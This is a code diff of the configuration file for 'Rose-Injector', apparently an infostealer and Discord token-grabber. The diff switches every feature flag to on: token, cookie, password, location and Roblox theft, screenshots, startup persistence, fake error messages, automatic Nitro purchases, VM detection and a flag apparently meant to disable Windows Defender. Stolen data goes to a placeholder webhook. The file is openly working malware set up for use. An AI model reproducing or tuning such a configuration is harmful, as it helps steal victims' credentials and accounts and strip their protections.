@@ -1,27 +1,27 @@
 class Config:
     def __init__(self):
         self.webhook = 'WEBHOOK_URL'
-        self.vm_detect_webhook = 'VMHOOK'
+        self.vm_detect_webhook = self.webhook
 
         self.debug_mode = True
 
         self.discord_rat = False
         self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
 
-        self.discord_ping = False
-        self.injection = False
-        self.token_stealing = False
-        self.cookie_stealing = False
-        self.password_stealing = False
-        self.malicious_stealing = False
-        self.location_stealing = False
-        self.roblox_stealing = False
-        self.screenshot = False
-        self.start_up = False
-        self.fake_error = False
-        self.nitro_auto_buy = False
-        self.defenderfucker = False
-        self.vmdetection = False
+        self.discord_ping = True
+        self.injection = True
+        self.token_stealing = True
+        self.cookie_stealing = True
+        self.password_stealing = True
+        self.malicious_stealing = True
+        self.location_stealing = True
+        self.roblox_stealing = True
+        self.screenshot = True
+        self.start_up = True
+        self.fake_error = True
+        self.nitro_auto_buy = True
+        self.defenderfucker = True
+        self.vmdetection = True
         
         self.eb_color = 16711680
         self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector'
